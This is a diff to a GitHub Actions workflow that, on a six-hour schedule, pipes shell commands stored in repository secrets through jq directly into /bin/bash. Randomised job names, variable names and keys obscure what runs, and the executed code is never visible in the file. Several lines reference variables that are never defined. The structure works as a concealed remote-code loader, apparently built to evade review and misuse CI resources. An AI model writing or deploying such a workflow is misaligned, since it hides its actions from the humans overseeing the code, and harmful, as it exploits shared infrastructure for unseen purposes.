@@ -1,23 +1,24 @@
 name: factorycurrently
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 5/6 * * *'
+    - cron: '48 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: factorycurrently
         env:
-          e3: ${{ secrets.e3 }}
+          uaae4: ${{ secrets.uaae4 }}
         run: |
-          echo $e3 | jq -r .eu76641 | /bin/bash
-          echo $d4 | jq -r .va57798 | /bin/bash
-          echo $tvbc5 | jq -r .nf7380 | /bin/bash
-          echo $fax3612 | jq -r .y8748 | /bin/bash
-          echo $lr0945 | jq -r .ndjzi8 | /bin/bash
-          echo $pn0366 | jq -r .fhyo0462 | /bin/bash
-          echo $iileh3526 | jq -r .hixon664 | /bin/bash
+          echo $uaae4 | jq -r .powj0 | /bin/bash
+          echo $i4787 | jq -r .iw9929 | /bin/bash
+          echo $sw717 | jq -r .baec739 | /bin/bash
+          echo $e5 | jq -r .exzsy0949 | /bin/bash
+          echo $ij19 | jq -r .sec22589 | /bin/bash
+          echo $wsy57269 | jq -r .xuvof558 | /bin/bash
+          echo $kcxef6167 | jq -r .rxah42887 | /bin/bash
+          echo $r0938 | jq -r .l1536 | /bin/bash
 
